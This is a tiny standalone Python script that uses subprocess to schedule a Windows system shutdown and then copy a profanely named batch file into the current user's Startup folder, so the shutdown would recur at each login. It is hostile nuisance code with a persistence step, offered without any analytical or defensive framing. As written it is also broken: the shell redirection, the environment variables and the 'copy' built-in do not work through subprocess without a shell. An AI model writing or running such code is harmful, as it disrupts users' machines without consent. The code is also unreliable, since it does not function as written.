import os
import subprocess
import platform

subprocess.run(["shutdown", "/s", "/t", "10000" , ">%temp%\\fuck.bat"], check=True)
subprocess.run(["copy", "%temp%\\fuck.bat", "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"], check=True)
